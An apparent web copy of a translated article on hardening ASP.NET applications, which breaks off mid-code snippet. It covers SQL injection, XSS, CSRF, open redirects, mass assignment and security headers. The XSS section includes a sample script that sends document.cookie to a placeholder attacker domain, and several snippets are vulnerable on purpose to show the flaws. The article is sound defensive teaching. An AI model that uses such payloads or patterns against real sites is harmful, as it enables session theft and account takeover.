<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Protection of ASP.NET applications from hacking</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ASP.NET MVC is not the most hyip but quite popular stack among web developers. From the point of view of (anti) hacker, its standard functionality giv...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Protection of ASP.NET applications from hacking</h1><div class="post__text post__text-html js-mediator-article"><p>  ASP.NET MVC is not the most hyip but quite popular stack among web developers.  From the point of view of (anti) hacker, its standard functionality gives you some basic level of security, but additional protection is needed to protect against the absolute majority of hacker tricks.  In this article we will look at the basics that an ASP.NET developer needs to know about (be it Core, MVC, MVC Razor, or Web Forms). </p><br><p><img src="https://habrastorage.org/webt/pl/yr/8u/plyr8u235oyo1jfxc5d-vtkrgh4.jpeg"><a name="habracut"></a></p><br><p>  <i>Note: we continue the series of publications of the full versions of articles from the magazine Hacker.</i>  <i>Spelling and punctuation of the author saved.</i> </p><br><p>  <em>I give the word to the author.</em> </p><br><p>  I think many will agree with me that ASP.NET MVC is a stack of quite popular technologies.  Although the technology has long been at the peak of HYIP, but the demand for .NET web developers is quite high. </p><br><p>  At the same time, the development must take into account safety aspects.  Although some functionality and saves from the well-known classic attacks, but from a fairly large number of hacker tricks require additional protection.  Let's look at popular types of attacks and ways to protect.  Must know for an ASP.NET developer (be it Core, MVC, MVC Razor or WebForms). </p><br><p>  Let's start with all known types of attacks. </p><br><h2>  SQL Injection </h2><br><p>  Oddly enough, but in 2017, Injection and, in particular, SQL Injection is in the first place among the Top-10 security risks of the OWASP ( <a href="https://www.owasp.org/images/0/0a/OWASP_Top_10_2017_GM_%2528en%2529.pdf">Open Web Application Security Project</a> ). This type of attack means that the data entered by the user are used on the server side as query parameters. </p><br><p>  An example of a classic SQL injection is more typical for Web Forms applications. <br>  The use of parameters as query values ‚Äã‚Äãhelps protect against attacks: </p><br><pre><code class="hljs sql">string commandText = "<span class="hljs-keyword"><span class="hljs-keyword">UPDATE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SET</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Status</span></span> = <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> CustomerID = @<span class="hljs-keyword"><span class="hljs-keyword">ID</span></span>;"; SqlCommand command = new SqlCommand(commandText, connectionString); command.Parameters.AddWithValue("@ID", customerID);</code> </pre> <br><p>  If you are developing an MVC application, the Entity Framework covers up some of the vulnerabilities.  In order for the MVC / EF application to work, SQL injection needs to be managed.  However, this is possible if you execute SQL code using <a href="https://msdn.microsoft.com/ru-ru/library/system.data.linq.datacontext.executequery(v%3Dvs.110).aspx">ExecuteQuery</a> or call poorly written stored procedures. </p><br><p>  Despite the fact that ORM allows you to avoid SQL Injection (except for the examples above), it is recommended to limit the attributes to values ‚Äã‚Äãthat the model fields can take, and therefore forms.  For example, if it is assumed that only text can be entered in the field, then using Regex expressions specify the range from ^ [a-zA-Z] + $ <br>  If numbers should be entered in the field, then indicate this as a requirement: </p><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">RegularExpression(@</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"\d{5}"</span></span></span><span class="hljs-meta">, ErrorMessage = </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"   5 "</span></span></span><span class="hljs-meta">)</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> Zip { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; }</code> </pre> <br><p>  In WebForms, you can limit the possible values ‚Äã‚Äãusing validators.  Example: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:TextBox</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"txtName"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:TextBox</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:RegularExpressionValidator</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"nameRegex"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ControlToValidate</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"txtName"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ValidationExpression</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"^[a-zA-Z'.\s]{1,40}$"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ErrorMessage</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"    "</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br><p>  Starting with .NET 4.5, WebForms use Unobtrusive Validation.  This means that no additional code is required to check the value of the form. </p><br><p>  Validation of particular data helps protect against another well-known vulnerability called Cross-Site Scripting (XSS). </p><br><h2>  Xss </h2><br><p>  A typical XSS example is adding a script to a comment or guestbook entry.  For example, such: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.location=</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'https://verybadcoolhacker.com/?cookie='</span></span></span><span class="javascript">+</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">encodeURIComponent</span></span></span><span class="javascript">(</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.cookie)</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  As you understand, in this example, cookies from your site are passed as a parameter to some hacker site. </p><br><p>  In Web Forms, you can make an error with something like this: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">username</span></span></span><span class="hljs-tag"> %&gt;</span></span>,   <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  It is clear that instead of username there can be a script.  To avoid running the script, you can at least use another ASP.NET expression: &lt;%: username%&gt;, which encodes its contents. </p><br><p>  If you use Razor, then the lines are automatically encoded.  So to get the XSS you need to try and make a mistake.  For example, use <a href="https://habrahabr.ru/users/html/" class="user_link">Html</a> .Raw (Model.username).  Or in your model use MvcHtmlString instead of string </p><br><p>  For additional protection against XSS, data is also encoded in C # code.  In .NET Core, you can use the following encoders from the System.Text.Encodings.Web namespace: HtmlEncoder, JavaScriptEncoder, and UrlEncoder </p><br><p>  The following example returns the string "&lt;script&gt;": </p><br><pre> <code class="hljs pgsql">string encodedString = HtmlEncoder.<span class="hljs-keyword"><span class="hljs-keyword">Default</span></span>.Encode("&lt;script&gt;");</code> </pre> <br><p>  Classic .NET uses HttpUtility.HtmlEncode.  And starting with .NET 4.5, AntiXssEncoder can be made the default encoder.  This is done by adding a single attribute to the httpRuntime tag of the web.config file: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpRuntime</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">targetFramework</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"4.7"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">encoderType</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"System.Web.Security.AntiXss.AntiXssEncoder"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br><p>  Thus, using the old HttpUtility.HtmlEncode code, you will actually use the new more vulnerability-resistant class (the new code will also use the old HttpServerUtility, and HttpResponseHeader classes). </p><br><p>  It is recommended to encode strings not before saving to the database, but before displaying. <br>  In addition, if you use some string entered by the user as a parameter to pass to the URL, then be sure to use UrlEncoder. </p><br><h2>  Cross-Site Request Forgery (CSRF) </h2><br><p>  Wikipedia in the ‚Äúaliexpress‚Äù style claims that in Russian it sounds like ‚ÄúCross-site request forgery‚Äù. </p><br><p>  This is a type of attack in which a user visits a malicious website, and this website sends requests to another website.  On a good site on which the user is registered, and which he recently visited.  It may happen that the authorization information on a good site still remains in the cookie.  Then some malicious, hidden action may well be committed. </p><br><p>  To avoid this attack in MVC, the well-known <a href="https://habrahabr.ru/users/html/" class="user_link">Html</a> .AntiForgeryToken () helper added to the View helps everyone.  And the attribute [ValidateAntiForgeryToken] added before the action controller. </p><br><p>  This method of protection is of the type STP (synchronizer token pattern).  The point is that when entering a page, the server sends a token to the user, and after the user makes a request, he sends the token back to the server for verification together with the data.  Tokens can be stored both in the header and in a hidden field or cookie. </p><br><p>  Razor pages are protected by default against XSRF / CSRF attacks.  But if you use AJAX requests, then you can send tokens in the header.  This is not as simple as using AntiForgeryToken. </p><br><p>  To configure this feature, ASP.NET Core uses the following service: <a href="https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery">Microsoft.AspNetCore.Antiforgery.IAntiforgery</a> . </p><br><p>  Classic ASP.NET applications use the AntiForgery.GetTokens method to generate tokens and AntiForgery.Validate to verify the tokens received by the server side. </p><br><p>  Read more here: <a href="https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks">Anti-CSRF and AJAX</a> </p><br><h2>  Open redirect attacks </h2><br><p>  Be careful with redirects.  The following code is very dangerous: </p><br><pre> <code class="hljs vbscript"><span class="hljs-built_in"><span class="hljs-built_in">Response</span></span>.Redirect(<span class="hljs-built_in"><span class="hljs-built_in">Request</span></span>.QueryString[<span class="hljs-string"><span class="hljs-string">"Url"</span></span>]);</code> </pre> <br><p>  The attacker can add a link to your site.  And the user, having seen that the URL starts from a good site, may not consider the address completely (especially if it is long) but click on the link, thus switching to the harmful site from yours.  This vulnerability can be used in particular for phishing.  Phishing link example: <br>  <a href="http://www.goodweebsite.com">http://www.goodwebsite.com/Redirect?url=http://www.goodweebsite.com</a> </p><br><p>  Many users receive an e-mail with a link looking to see if the domain is the same and do not expect to be redirected by a link from a good website to a bad one.  And if the redirect opens a page with the same design, then many users will enter their username and password without hesitation (thinking that they have accidentally logged out of their account).  After that, they can be redirected by intruders to the real site. </p><br><p>  This type of attack also applies to MVC.  The following example checks whether the link is local: </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">RedirectToLocalPage</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> redirectUrl</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Url.IsLocalUrl(redirectUrl)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Redirect(redirectUrl); <span class="hljs-comment"><span class="hljs-comment">// ‚Ä¶. }</span></span></code> </pre> <br><p>  To protect against this type of attack, you can also use the LocalRedirect helper method. </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">RedirectToLocalPage</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> redirectUrl</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> LocalRedirect(redirectUrl); }</code> </pre> <br><p>  In general, try never to trust the data received. </p><br><h2>  Mass assignment </h2><br><p>  Let us examine this vulnerability by example. <br>  Suppose there is a simple model with two properties in your website. </p><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">UserModel</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> Name { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> IsAdmin { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } }</code> </pre> <br><p>  And there is a rather ordinary and also quite simple view. </p><br><pre> <code class="hljs scala"><span class="hljs-meta"><span class="hljs-meta">@model</span></span> <span class="hljs-type"><span class="hljs-type">UserModel</span></span> &lt;form asp-action=<span class="hljs-string"><span class="hljs-string">"Vulnerable"</span></span> asp-<span class="hljs-type"><span class="hljs-type">Controller</span></span>=<span class="hljs-string"><span class="hljs-string">"Home"</span></span>&gt; &lt;div <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"form-group"</span></span>&gt; &lt;label asp-<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>=<span class="hljs-string"><span class="hljs-string">"Name"</span></span>&gt;&lt;/label&gt; &lt;input <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"form-control"</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"text"</span></span> asp-<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>=<span class="hljs-string"><span class="hljs-string">"Name"</span></span> /&gt; &lt;/div&gt; &lt;div <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"form-group"</span></span>&gt; <span class="hljs-meta"><span class="hljs-meta">@if</span></span> (<span class="hljs-type"><span class="hljs-type">Model</span></span>.<span class="hljs-type"><span class="hljs-type">IsAdmin</span></span>) { &lt;i&gt;<span class="hljs-type"><span class="hljs-type">You</span></span> are an admin&lt;/i&gt; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { &lt;i&gt;<span class="hljs-type"><span class="hljs-type">You</span></span> are a standard user&lt;/i&gt; } &lt;/div&gt; &lt;button <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"btn btn-sm"</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">type</span></span></span></span>=<span class="hljs-string"><span class="hljs-string">"submit"</span></span>&gt;<span class="hljs-type"><span class="hljs-type">Submit</span></span>&lt;/button&gt; &lt;/form&gt;</code> </pre> <br><p>  With this view, you can only edit the username, right? <br>  And now let's move on to the same simple code: </p><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">HttpPost</span></span>] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Vulnerable</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id, UserModel model</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> View(<span class="hljs-string"><span class="hljs-string">"Index"</span></span>, model); }</code> </pre> <br><p>  Everything is fine, right? <br>  As it turns out, not at all.  And all because of the fact that the action is marked as HttpPost. <br>  In order to make sure of this, it is enough to open a utility like Postman or Fiddler and send a POST request to the address with indication of the parameters id and IsAdmin.  If you are testing locally, then the address would be: localhost: 51696 / Home / Vulnerable? Id = 34 &amp; IsAdmin = true </p><br><p><img src="https://habrastorage.org/webt/ns/vr/80/nsvr802xsumlidgwhoah1l2z5gc.png"></p><br><p>  As you can see in the screenshot, access to secret information is obtained (in the HTML code, you are an admin is visible) </p><br><p>  How to avoid this type of attack?  The simplest option is not to fall into a situation when an object is transmitted with HttpPost.  And if such a situation cannot be avoided, then be prepared for anything that can be transmitted.  One option is to create a separate class for transmitting it via HttpPost.  This can be either the base class of the current class with public parameters, or a twin class.  In this class, important fields can be marked with the Editable attribute with the value false: </p><br><pre> <code class="hljs json">[Editable(<span class="hljs-literal"><span class="hljs-literal">false</span></span>)]</code> </pre> <br><p>  Many attacks can be avoided by setting certain values ‚Äã‚Äãin the request header.  Headers are not supported by all browsers (mostly not supported by older versions).  Consider some popular types of attacks that can be avoided by installing Headers. </p><br><h2>  Xss </h2><br><p>  Already discussed above type of attack.  For additional protection, you can use the content-security-policy header.  It allows you to download content only from certain resources.  For example, you can allow running scripts from the current site only: </p><br><pre> <code class="hljs pgsql">content-<span class="hljs-keyword"><span class="hljs-keyword">security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">policy</span></span>: script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span></code> </pre> <br><p>  It is also possible to specify trusted sites, access to the content of which is allowed. <br>  The following header also helps protect against XSS, although, as a rule, it is enabled by browsers by default: x-xss-protection.  Example: </p><br><pre> <code class="hljs dos">x-xss-protection: <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">mode</span></span>=block</code> </pre> <br><h2>  Click jacking </h2><br><p>  Having entered a website, a window can be opened to the user, a link or banner over which some hidden button / link is added inside the transparent iframe.  And it turns out that the user clicks on something that he wants to click on, but in fact he clicks on a hidden object against his will. </p><br><p>  Setting the header "X-FRAME-OPTIONS" with the value "DENY" will prohibit the placement of the pages of your site in the iframe.  If your site does not have frames, then this is a good option for you.  If you use an iframe to display the pages of your site, then the value SAMEORIGIN will allow you to display the pages of your site in the frame, but only on other pages of the same your site. </p><br><h2>  MIME sniffing </h2><br><p>  This is not the name of the attack method, but the scan of the file contents, which is primarily related to XSS.  Often, an attacker can download any harmful code in the form of a file with a completely harmless extension.  For example, as a video tag.  And it may happen that the browser recognizes the file as a code and executes it.  To prevent this from happening, setting the "X-Content-Type-Options: nosniff" header can be used.  When this header is received, the browser will check whether the contents of the file are the contents of the exact format specified (this check is called MIME sniffing). </p><br><h2>  Referrer-Policy </h2><br><p>  Browsers automatically add a link to the site from which the transition was made to the request headers when they switch to a site.  This is very convenient for analytics.  For example, it will not be difficult to write some code that will compile statistics for you with a list of sites from which visitors access your site.  However, if there are requests with some confidential information in the stock address on your site, it would be very desirable to hide this information from other sites.  For example: <a href="http://www.somegoodsite.com/Edit%3Fid%3D34543276654">http://www.somegoodsite.com/Edit?id=34543276654</a> </p><br><p>  In order to hide your link when you go to another site, you can set a header with the value "Referrer-Policy: no-referrer" </p><br><h2>  How to add request headers to your site </h2><br><p>  Query headers can be set using either the IIS settings or from the application code.  We will not consider setting up IIS, but consider options for installing headers from code. </p><br><p>  In order to add a header in ASP.NET Core, you can create Middleware.  Middleware, as the name implies, is some kind of intermediate code located somewhere in the middle of the request and response process chain. <br>  Here is an example of a pair of classes that allows you to add an X-Frame-Options header: DENY </p><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HeadersMiddleware</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> RequestDelegate _next; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HeadersMiddleware</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">RequestDelegate next</span></span></span><span class="hljs-function">)</span></span> { _next = next; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">async</span></span></span><span class="hljs-function"> Task </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Invoke</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">HttpContext context</span></span></span><span class="hljs-function">)</span></span> { IHeaderDictionary headers = context.Response.Headers; headers[<span class="hljs-string"><span class="hljs-string">"X-Frame-Options"</span></span>] = <span class="hljs-string"><span class="hljs-string">"DENY"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> _next(context); } } <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HeadersMiddlewareExtensions</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> IApplicationBuilder </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">UseHeadersMiddleware</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params"> IApplicationBuilder builder</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> builder.UseMiddleware&lt;HeadersMiddleware&gt;(); } }</code> </pre> <br><p>  You can register the resulting middleware in the Configure method of the Startup.cs file with one line: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">app</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.UseHeadersMiddleware</span></span>();</code> </pre> <br><p>  Now among the list of headers received from the server, we can see our newly added X-Frame-Options </p><br><p><img src="https://habrastorage.org/webt/eu/8o/gn/eu8ognsm5_gzhik6kf3sff4ypay.png"></p><br><p>  You can even not use Middleware, but add the header immediately to the Config method of the Startup.cs file, replacing </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">app</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.UseHeadersMiddleware</span></span>();</code> </pre> <br><p>  on </p><br><pre> <code class="hljs vbscript">app.Use(async (context, <span class="hljs-keyword"><span class="hljs-keyword">next</span></span>) =&gt; { context.<span class="hljs-built_in"><span class="hljs-built_in">Response</span></span>.Headers.Add(<span class="hljs-string"><span class="hljs-string">"X-Frame-Options"</span></span>, <span class="hljs-string"><span class="hljs-string">"SAMEORIGIN"</span></span>); await <span class="hljs-keyword"><span class="hljs-keyword">next</span></span>(); });</code> </pre> <br><p>  This method looks easier.  In addition, it can be used to set headers for all content or only for dynamic content (respectively, add the code before the app.UseStaticFiles () line and after). </p><br><h2>  INFO </h2><br><p>  Dynamic content is files that, respectively, contain dynamic model data.  Static content is such files as html, css, js, jpg, etc. </p><br><p>  In classic ASP.NET, adding a header is done in a slightly different way. <br>  There are two options.  The first is to add tags to the system.webServer section of the web.config file.  For example, such: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpProtocol</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">customHeaders</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">add</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"X-Frame-Options"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SAMEORIGIN"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">remove</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"X-Powered-By"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">customHeaders</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpProtocol</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Note that you can not only add, but also delete tags.  The example removes the X-Powered-By header.  The less information we disclose, the better, right?  Result: </p><br><p><img src="https://habrastorage.org/webt/1l/tc/aj/1ltcajhmrl7n-pnv-sg6faeabga.png"></p><br><p>  In addition to the X-Powered-By header, it is quite possible to remove the Server and X-AspNet-Version headers as well. <br>  The second option to add headers is to add the Application_BeginRequest method to the Global.asax file. </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span 